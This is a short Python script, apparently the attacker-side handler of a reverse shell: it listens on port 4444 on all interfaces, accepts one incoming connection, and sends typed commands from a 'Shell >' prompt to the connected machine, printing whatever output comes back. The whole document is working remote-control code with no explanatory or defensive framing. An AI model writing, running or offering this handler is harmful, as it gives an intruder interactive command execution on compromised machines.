import socket

# Server setup
host = '0.0.0.0'
port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)

print(f"[+] Listening on {host}:{port}")
client_socket, client_address = server.accept()
print(f"[+] Connection received from {client_address[0]}:{client_address[1]}")

# Command loop
while True:
    command = input("Shell > ")
    if command.lower() == 'exit':
        client_socket.send(b'exit')
        break
    if command.strip() == '':
        continue

    client_socket.send(command.encode())
    response = client_socket.recv(4096).decode()
    print(response)

client_socket.close()
